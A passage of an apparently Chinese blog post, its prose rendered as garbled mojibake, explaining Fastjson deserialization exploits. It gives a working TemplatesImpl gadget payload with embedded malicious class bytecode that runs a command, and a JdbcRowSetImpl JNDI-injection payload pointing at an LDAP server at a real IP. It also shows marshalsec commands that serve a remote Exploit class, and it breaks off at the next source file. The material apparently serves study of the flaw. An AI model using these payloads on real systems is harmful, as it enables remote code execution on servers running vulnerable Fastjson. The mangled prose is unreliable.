<code>com.alibaba.fastjson.util.JavaBeanInfo.build()</code> ä¸­ã€‚</p></li><li><p>ä½¿ç”¨ <code>JSON.parseObject(jsonString)</code> å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter éƒ½è¢«è°ƒç”¨ã€‚</p></li><li><p>å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>Feature.SupportNonPublicField</code> å‚æ•°ã€‚</p></li><li><p>fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° <code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch()</code> æ–¹æ³•ï¼Œä¼šå¿½ç•¥ <code>_|-</code> å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« <code>_a_g_e_</code>ï¼Œgetter æ–¹æ³•ä¸º <code>getAge()</code>ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ <code>_</code> å’Œ <code>-</code> è¿›è¡Œç»„åˆæ··æ·†ã€‚</p></li><li><p>fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚</p></li></ul><h2 id="TemplatesImpl-ååºåˆ—åŒ–">TemplatesImpl ååºåˆ—åŒ–</h2><p>Fastjsonï¼ˆ1.2.2 - 1.2.4ï¼‰åœ¨å¯ç”¨äº†<code>SupportNonPublicField</code>ç‰¹æ€§æ—¶å¯ä»¥åˆ©ç”¨Xalançš„TemplatesImplå®ç°RCE</p><p>Fastjsonä¼šåˆ›å»º<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>ç±»å®ä¾‹ï¼Œå¹¶é€šè¿‡jsonä¸­çš„å­—æ®µå»æ˜ å°„<code>TemplatesImpl</code>ç±»ä¸­çš„æˆå‘˜å˜é‡ï¼Œæ¯”å¦‚å°†<code>_bytecodes</code> ç»è¿‡Base64è§£ç åå°†byte[]æ˜ å°„åˆ°<code>TemplatesImpl</code>ç±»çš„<code>_bytecodes</code>ä¸Šï¼Œå…¶ä»–å­—æ®µåŒç†ã€‚ä½†ä»…ä»…æ˜¯å±æ€§æ˜ å°„æ˜¯æ— æ³•è§¦å‘ä¼ å…¥çš„ç±»å®ä¾‹åŒ–çš„ï¼Œè¿˜å¿…é¡»è¦è°ƒç”¨<code>getOutputProperties()</code>æ–¹æ³•æ‰ä¼šè§¦å‘<code>defineClass</code>ï¼ˆä½¿ç”¨ä¼ å…¥çš„æ¶æ„ç±»å­—èŠ‚ç åˆ›å»ºç±»ï¼‰å’Œ<code>newInstance</code>ï¼ˆåˆ›å»ºæ¶æ„ç±»å®ä¾‹ï¼Œä»è€Œè§¦å‘æ¶æ„ç±»æ„é€ æ–¹æ³•ä¸­çš„å‘½ä»¤æ‰§è¡Œä»£ç ï¼‰</p><p>é¦–å…ˆå¯ä»¥åœ¨Templateslmpl#getTransletInstanceä¸­å¾—åˆ°å®ä¾‹åŒ–å‡½æ•°</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318223615243.png" alt="image-20240318223615243"></p><p>å¯ä»¥å‘ç°è¿™æ˜¯å°†_classè¿™ä¸ªæ•°ç»„ä¸­çš„[_transletIndex]è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œæ‰€ä»¥è¿™å°±å¯ä»¥ç¡®å®šäº†æˆ‘ä»¬é“¾å­çš„æœ€ç»ˆåˆ©ç”¨ç‚¹</p><p>é€šè¿‡æŸ¥çœ‹å®ä¾‹æˆ‘ä»¬å¯ä»¥å‘ç°å¦‚ä¸‹å…³ç³»ï¼Œç±»ä¸­çš„ <code>getOutputProperties()</code> æ–¹æ³•è°ƒç”¨ <code>newTransformer()</code> æ–¹æ³•ï¼Œè€Œ <code>newTransformer()</code> åˆè°ƒç”¨äº† <code>getTransletInstance()</code> æ–¹æ³•ã€‚å›¾å¦‚ä¸‹</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224736921.png" alt="image-20240318224736921"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224746475.png" alt="image-20240318224746475"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318224924186.png" alt="image-20240318224924186"></p><p>é‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±è¦çœ‹getOutputProperties()æ˜¯å¦å¯æ§äº†ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯OutputPropertiesçš„getteræ–¹æ³•ï¼Œç„¶åå°±æ˜¯çœ‹ä¸Šé¢æ‰€æåˆ°çš„classæ•°ç»„æ˜¯å¦å¯æ§ï¼Œè¿™å†³å®šäº†æˆ‘ä»¬æ˜¯å¦å¯ä»¥å®ä¾‹åŒ–æˆ‘ä»¬æ‰€è¦åŠ è½½çš„æ¶æ„ç±»</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318225328005.png" alt="image-20240318225328005"></p><p>å¯ä»¥å‘ç°åœ¨ä¸Šå›¾çš„å‚æ•°å…·æœ‰èµ‹å€¼æ“ä½œï¼Œå…¶ä¸­defineTransletClassesåœ¨getTransletInstanceæ˜¯æœ‰è°ƒç”¨çš„ï¼Œåªè¦_classä¸ºç©ºå°±å¯ä»¥è°ƒç”¨ï¼Œè¯¦è§ä¸‹å›¾</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318225536452.png" alt="image-20240318225536452"></p><p>åˆ†ædefineTransletClasseså¯ä»¥å¾—åˆ°ï¼Œå¦‚æœ_bytecodesä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±ä¼šè¿›è¡Œè‡ªå®šä¹‰ç±»çš„è°ƒç”¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319102645958.png" alt="image-20240319102645958"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240318231646986.png" alt="image-20240318231646986"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ æ¶æ„ç±»ï¼Œå½¢æˆpayloadäº†</p><p>Shell.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.IIOException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Base64Encoder.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Encoder</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// æ›¿æ¢ä¸ºä½ çš„å­—èŠ‚ç æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;./out/production/1.2.24/Shell.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] classBytes = Files.readAllBytes(Paths.get(filePath));</span><br><span class="line">        <span class="type">String</span> <span class="variable">encoded</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(classBytes);</span><br><span class="line">        System.out.println(encoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•ä»£ç FastjsonTest1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADQANgoACAAmCAAnCgAoACkKACgAKgcAKwoABQAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAdMU2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACQAKAQAEY2FsYwcAMAwAMQAyDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA1AAoBAAVTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACgANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAcQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAMADAAAABoABgAAAA4AAwAPAAsAEgAOABAADwARABMAEwANAAAAFgACAAMACAAeAB8AAAAPAAQAIAAhAAAAIgAAAAcAAk4HACMEAAEAJAAAAAIAJQ==&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;Chu0&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºpayload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQANgoACAAmCAAnCgAoACkKACgAKgcAKwoABQAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAdMU2hlbGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACsBAApTb3VyY2VGaWxlAQAKU2hlbGwuamF2YQwACQAKAQAEY2FsYwcAMAwAMQAyDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAA1AAoBAAVTaGVsbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAACgANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHQANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAcQACAAEAAAAUEgJLuAADKrYABFenAAhLKrYABrEAAQAAAAsADgAFAAMADAAAABoABgAAAA4AAwAPAAsAEgAOABAADwARABMAEwANAAAAFgACAAMACAAeAB8AAAAPAAQAIAAhAAAAIgAAAAcAAk4HACMEAAEAJAAAAAIAJQ==&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Chu0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_auxClasses&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_transletIndex&quot;</span><span class="punctuation">:</span><span class="number">0</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„_nameå’Œ_tfactoryæ˜¯ä¸ºäº†é˜²æ­¢ä¸ºnullè¿›è€ŒæŠ¥é”™ï¼Œé“¾å­åˆ†æ</p><p>fjä¼šåœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„å‚æ•°çš„getteræˆ–è€…setteræ–¹æ³•ï¼Œè¿™é‡Œæ˜¯getteræ–¹æ³•ä¹Ÿå°±æ˜¯getOutputProperties()ï¼Œè¿™æ˜¯å…¥å£ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨è¯¥æ–¹æ³•ä¸­çš„newTransformer()ï¼Œå†åˆ°newTransformer()æ–¹æ³•ä¸­çš„getTransletInstance()ï¼Œç”±äºæˆ‘ä»¬çš„_classä¸ºç©ºï¼Œæ‰€ä»¥æ ¹æ®é€»è¾‘åˆä¼šè§¦å‘defineTransletClassesï¼Œç”±äº_bytecodesä¸ä¸ºnullï¼Œæ‰€ä»¥å°±ä¼šå°†_bytecodes[0]ä¸­çš„å­—èŠ‚ç åŠ è½½è¿›_class[0]ä¸­ï¼Œæœ€åï¼Œåœ¨_class[_transletIndex].getConstructor().newInstance();å°†æ¶æ„ç±»è¿›è¡Œå®ä¾‹åŒ–ï¼Œæ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„å‘½ä»¤</p><h2 id="JdbcRowSetImpl-ååºåˆ—åŒ–">JdbcRowSetImpl ååºåˆ—åŒ–</h2><p>å¾ˆå¥½ç†è§£com.sun.rowset.JdbcRowSetImplæœ‰ä¸¤ä¸ªå‡½æ•°ï¼Œä¸€ä¸ªæ˜¯setAutoCommit()ï¼Œä¸€ä¸ªæ˜¯connect()ï¼Œæ¼æ´çš„ä¸»è¦æˆå› æ˜¯connectä¸­çš„lookupå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸‹é¢æ˜¯setAutoCommit</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319105150237.png" alt="image-20240319105150237"></p><p>åœ¨è¿™é‡Œè°ƒç”¨äº†connectæ–¹æ³•ï¼Œç»§ç»­è·Ÿè¸ª</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240319105245765.png" alt="image-20240319105245765"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å°±çœ‹åˆ°äº†lookupå‡½æ•°ï¼Œä»–çš„å‚æ•°æ˜¯getDataSourceNameï¼Œæ ¹æ®fjçš„è¿è¡ŒåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥æ˜ç™½åœ¨åˆ›å»ºå®ä¾‹çš„æ—¶å€™fjä¼šè°ƒç”¨å¯¹åº”å‚æ•°çš„getteræˆ–è€…setteræ–¹æ³•ï¼Œpayloadå¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://110.41.17.183:5555/ExploitTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>é“¾å­åˆ†æï¼Œåœ¨è¿™é‡Œå…ˆè§¦å‘getdataSourceNameç»™dataSourceNameèµ‹å€¼ï¼Œå†è§¦å‘setteræ–¹æ³•è§¦å‘setAutoCommitï¼Œè¿›è€Œå®Œæˆæ•´æ¡é“¾å­</p><p>å¼€å¯httpæœåŠ¡</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.<span class="keyword">server</span></span><br><span class="line"><span class="meta">#é»˜è®¤8000ç«¯å£</span></span><br></pre></td></tr></table></figure><p>å·¥å…·<strong>marshalsec-0.0.3-SNAPSHOT-all.jar</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="string">&quot;http://110.41.17.183:8080/#Exploit&quot;</span> <span class="number">5555</span></span><br><span class="line"><span class="attribute">java</span> -cp marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-<span class="literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://110.41.17.183:8080/#Exploit&quot;</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure><p>åœ¨æŸipï¼Œä¸€èˆ¬å°±ä¸ºæœ¬æœºipï¼Œå¼€å¯RMIæˆ–è€…LDAPæœåŠ¡</p><p>FastJsonServer.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://110.41.17.183:5555/ExploitTest\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ExploitTest.java</p><figure 